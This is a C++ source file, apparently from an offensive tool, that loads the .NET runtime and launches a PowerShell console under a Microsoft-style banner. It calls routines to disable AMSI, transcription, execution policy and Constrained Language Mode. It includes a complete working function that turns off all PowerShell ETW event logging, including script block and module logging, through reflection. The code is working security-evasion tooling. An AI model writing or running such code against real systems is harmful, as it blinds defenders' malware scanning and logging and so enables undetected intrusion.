#include "powershell.h"
#include "common.h"
#include "patch.h"

void StartPowerShell()
{
    mscorlib::_AppDomain* pAppDomain = NULL;
    CLR_CONTEXT cc = { 0 };
    VARIANT vtInitialRunspaceConfiguration = { 0 };
    LPCWSTR pwszBannerText = L"Windows PowerChell\nCopyright (C) Microsoft Corporation. All rights reserved.";
    LPCWSTR pwszHelpText = L"Help message";
    LPCWSTR ppwszArguments[] = { NULL };

    if (!InitializeCommonLanguageRuntime(&cc, &pAppDomain))
        goto exit;

    if (!CreateInitialRunspaceConfiguration(pAppDomain, &vtInitialRunspaceConfiguration))
        goto exit;

    if (!PatchAmsiOpenSession())
        PRINT_ERROR("Failed to disable AMSI.\n");

    if (!DisablePowerShellEtwProvider(pAppDomain))
        PRINT_ERROR("Failed to disable ETW Provider.\n");

    if (!PatchTranscriptionOptionFlushContentToDisk(pAppDomain))
        PRINT_ERROR("Failed to disable Transcription.\n");

    if (!PatchAuthorizationManagerShouldRunInternal(pAppDomain))
        PRINT_ERROR("Failed to disable Execution Policy enforcement.\n");

    if (!PatchSystemPolicyGetSystemLockdownPolicy(pAppDomain))
        PRINT_ERROR("Failed to disable Constrained Mode Language.\n");

    if (!StartConsoleShell(pAppDomain, &vtInitialRunspaceConfiguration, pwszBannerText, pwszHelpText, ppwszArguments, ARRAYSIZE(ppwszArguments)))
        goto exit;

exit:
    VariantClear(&vtInitialRunspaceConfiguration);
    DestroyCommonLanguageRuntime(&cc, pAppDomain);
}

//
// The following function retrieves an instance of the PSEtwLogProvider class, gets
// the value of its 'etwProvider' member, which is an EventProvider object, and sets
// the 'm_enabled' attribute of this latter object to 0, thus effectively disabling
// all PowerShell event logs in the current process. This includes Script Block
// Logging and Module Logging.
// 
// Credit:
//   - https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32
//
BOOL DisablePowerShellEtwProvider(mscorlib::_AppDomain* pAppDomain)
{
    BOOL bResult = FALSE;
    HRESULT hr;
    BSTR bstrPsEtwLogProviderFullName = SysAllocString(L"System.Management.Automation.Tracing.PSEtwLogProvider");
    BSTR bstrEtwProviderFieldName = SysAllocString(L"etwProvider");
    BSTR bstrEventProviderFullName = SysAllocString(L"System.Diagnostics.Eventing.EventProvider");
    BSTR bstrEnabledFieldName = SysAllocString(L"m_enabled");
    VARIANT vtEmpty = { 0 };
    VARIANT vtPsEtwLogProviderInstance = { 0 };
    VARIANT vtZero = { 0 };
    mscorlib::_Assembly* pCoreAssembly = NULL;
    mscorlib::_Assembly* pAutomationAssembly = NULL;
    mscorlib::_Type* pPsEtwLogProviderType = NULL;
    mscorlib::_FieldInfo* pEtwProviderFieldInfo = NULL;
    mscorlib::_Type* pEventProviderType = NULL;
    mscorlib::_FieldInfo* pEnabledInfo = NULL;

    if (!LoadAssembly(pAppDomain, ASSEMBLY_NAME_SYSTEM_CORE, &pCoreAssembly))
        goto exit;

    if (!LoadAssembly(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, &pAutomationAssembly))
        goto exit;

    hr = pAutomationAssembly->GetType_2(bstrPsEtwLogProviderFullName, &pPsEtwLogProviderType);
    EXIT_ON_HRESULT_ERROR(L"Assembly->GetType_2", hr);
    EXIT_ON_NULL_POINTER(L"PSEtwLogProvider type", pPsEtwLogProviderType);

    hr = pPsEtwLogProviderType->GetField(
        bstrEtwProviderFieldName,
        static_cast<mscorlib::BindingFlags>(mscorlib::BindingFlags::BindingFlags_Static | mscorlib::BindingFlags::BindingFlags_NonPublic),
        &pEtwProviderFieldInfo
    );

    EXIT_ON_HRESULT_ERROR(L"Type->GetField", hr);

    hr = pEtwProviderFieldInfo->GetValue(vtEmpty, &vtPsEtwLogProviderInstance);
    EXIT_ON_HRESULT_ERROR(L"FieldInfo->GetValue", hr);

    hr = pCoreAssembly->GetType_2(bstrEventProviderFullName, &pEventProviderType);
    EXIT_ON_HRESULT_ERROR(L"Assembly->GetType_2", hr);
    EXIT_ON_NULL_POINTER(L"EventProvider type", pEventProviderType);

    hr = pEventProviderType->GetField(
        bstrEnabledFieldName,
        static_cast<mscorlib::BindingFlags>(mscorlib::BindingFlags::BindingFlags_Instance | mscorlib::BindingFlags::BindingFlags_NonPublic),
        &pEnabledInfo
    );

    EXIT_ON_HRESULT_ERROR(L"Type->GetField", hr);

    InitVariantFromInt32(0, &vtZero);

    hr = pEnabledInfo->SetValue_2(vtPsEtwLogProviderInstance, vtZero);
    EXIT_ON_HRESULT_ERROR(L"FieldInfo->SetValue", hr);

    bResult = TRUE;

exit:
    if (bstrEnabledFieldName) SysFreeString(bstrEnabledFieldName);
    if (bstrEventProviderFullName) SysFreeString(bstrEventProviderFullName);
    if (bstrEtwProviderFieldName) SysFreeString(bstrEtwProviderFieldName);
    if (bstrPsEtwLogProviderFullName) SysFreeString(bstrPsEtwLogProviderFullName);

    if (pEnabledInfo) pEnabledInfo->Release();
    if (pEventProviderType) pEventProviderType->Release();
    if (pEtwProviderFieldInfo) pEtwProviderFieldInfo->Release();
    if (pPsEtwLogProviderType) pPsEtwLogProviderType->Release();
    if (pAutomationAssembly) pAutomationAssembly->Release();
    if (pCoreAssembly) pCoreAssembly->Release();

    VariantClear(&vtPsEtwLogProviderInstance);

    return bResult;
}

BOOL CreateInitialRunspaceConfiguration(mscorlib::_AppDomain* pAppDomain, VARIANT* pvtRunspaceConfiguration)
{
    HRESULT hr;
    BOOL bResult = FALSE;
    BSTR bstrRunspaceConfigurationFullName = SysAllocString(L"System.Management.Automation.Runspaces.RunspaceConfiguration");
    BSTR bstrRunspaceConfigurationName = SysAllocString(L"RunspaceConfiguration");
    SAFEARRAY* pRunspaceConfigurationMethods = NULL;
    VARIANT vtEmpty = { 0 };
    VARIANT vtResult = { 0 };
    mscorlib::_Assembly* pAutomationAssembly = NULL;
    mscorlib::_Type* pRunspaceConfigurationType = NULL;
    mscorlib::_MethodInfo* pCreateInfo = NULL;

    if (!LoadAssembly(pAppDomain, ASSEMBLY_NAME_SYSTEM_MANAGEMENT_AUTOMATION, &pAutomationAssembly))
        goto exit;

    hr = pAutomationAssembly->GetType_2(bstrRunspaceConfigurationFullName, &pRunspaceConfigurationType);
    EXIT_ON_HRESULT_ERROR(L"Assembly->GetType_2", hr);
    EXIT_ON_NULL_POINTER(L"RunspaceConfiguration type", pRunspaceConfigurationType);

    hr = pRunspaceConfigurationType->GetMethods(
        static_cast<mscorlib::BindingFlags>(mscorlib::BindingFlags::BindingFlags_Static | mscorlib::BindingFlags::BindingFlags_Public),
        &pRunspaceConfigurationMethods
    );

    EXIT_ON_HRESULT_ERROR(L"Type->GetMethods", hr);

    if (!FindMethodInArray(pRunspaceConfigurationMethods, L"Create", 0, &pCreateInfo))
        goto exit;

    if (!pCreateInfo)
    {
        wprintf(L"[-] Method RunspaceConfiguration.Create() not found.\n");
        goto exit;
    }

    hr = pCreateInfo->Invoke_3(vtEmpty, NULL, &vtResult);
    EXIT_ON_HRESULT_ERROR(L"MethodInfo->Invoke_3", hr);

    memcpy_s(pvtRunspaceConfiguration, sizeof(*pvtRunspaceConfiguration), &vtResult, sizeof(vtResult));
    bResult = TRUE;

exit:
    if (bstrRunspaceConfigurationFullName) SysFreeString(bstrRunspaceConfigurationFullName);
    if (bstrRunspaceConfigurationName) SysFreeString(bstrRunspaceConfigurationName);

    if (pRunspaceConfigurationMethods) SafeArrayDestroy(pRunspaceConfigurationMethods);

    if (pRunspaceConfigurationType) pRunspaceConfigurationType->Release();
    if (pAutomationAssembly) pAutomationAssembly->Release();

    return bResult;
}

BOOL StartConsoleShell(mscorlib::_AppDomain* pAppDomain, VARIANT* pvtRunspaceConfiguration, LPCWSTR pwszBanner, LPCWSTR pwszHelp, LPCWSTR* ppwszArguments, DWORD dwArgumentCount)
{
    BOOL bResult = FALSE;
    LONG lArgumentIndex;
    HRESULT hr;
    BSTR bstrConsoleShellFullName = SysAllocString(L"Microsoft.PowerShell.ConsoleShell");
    BSTR bstrConsoleShellName = SysAllocString(L"ConsoleShell");
    BSTR bstrConsoleShellMethodName = SysAllocString(L"Start");
    VARIANT vtEmpty = { 0 };
    VARIANT vtResult = { 0 };
    VARIANT vtBannerText = { 0 };
    VARIANT vtHelpText = { 0 };
    VARIANT vtArguments = { 0 };
    SAFEARRAY* pConsoleShellMethods = NULL;
    SAFEARRAY* pStartArguments = NULL;
    mscorlib::_Assembly* pConsoleHostAssembly = NULL;
    mscorlib::_Type* pConsoleShellType = NULL;
    mscorlib::_MethodInfo* pStartMethodInfo = NULL;

    if (!LoadAssembly(pAppDomain, ASSEMBLY_NAME_MICROSOFT_POWERSHELL_CONSOLEHOST, &pConsoleHostAssembly))
        goto exit;

    hr = pConsoleHostAssembly->GetType_2(bstrConsoleShellFullName, &pConsoleShellType);
    EXIT_ON_HRESULT_ERROR(L"Assembly->GetType_2", hr);
    EXIT_ON_NULL_POINTER(L"ConsoleShell type", pConsoleShellType);

    hr = pConsoleShellType->GetMethods(
        static_cast<mscorlib::BindingFlags>(mscorlib::BindingFlags::BindingFlags_Static | mscorlib::BindingFlags::BindingFlags_Public),
        &pConsoleShellMethods
    );

    EXIT_ON_HRESULT_ERROR(L"Type->GetMethods", hr);

    if (!FindMethodInArray(pConsoleShellMethods, L"Start", 4, &pStartMethodInfo))
        goto exit;

    InitVariantFromString(pwszBanner, &vtBannerText);
    InitVariantFromString(pwszHelp, &vtHelpText);
    InitVariantFromStringArray(ppwszArguments, dwArgumentCount, &vtArguments);

    pStartArguments = SafeArrayCreateVector(VT_VARIANT, 0, 4);

    lArgumentIndex = 0;
    SafeArrayPutElement(pStartArguments, &lArgumentIndex, pvtRunspaceConfiguration);
    lArgumentIndex = 1;
    SafeArrayPutElement(pStartArguments, &lArgumentIndex, &vtBannerText);
    lArgumentIndex = 2;
    SafeArrayPutElement(pStartArguments, &lArgumentIndex, &vtHelpText);
    lArgumentIndex = 3;
    SafeArrayPutElement(pStartArguments, &lArgumentIndex, &vtArguments);

    hr = pStartMethodInfo->Invoke_3(vtEmpty, pStartArguments, &vtResult);
    EXIT_ON_HRESULT_ERROR(L"MethodInfo->Invoke_3", hr);

    bResult = TRUE;

exit:
    if (bstrConsoleShellFullName) SysFreeString(bstrConsoleShellFullName);
    if (bstrConsoleShellName) SysFreeString(bstrConsoleShellName);
    if (bstrConsoleShellMethodName) SysFreeString(bstrConsoleShellMethodName);

    if (pStartArguments) SafeArrayDestroy(pStartArguments);
    if (pConsoleShellMethods) SafeArrayDestroy(pConsoleShellMethods);

    if (pConsoleShellType) pConsoleShellType->Release();
    if (pConsoleHostAssembly) pConsoleHostAssembly->Release();

    VariantClear(&vtBannerText);
    VariantClear(&vtHelpText);
    VariantClear(&vtArguments);

    return bResult;
}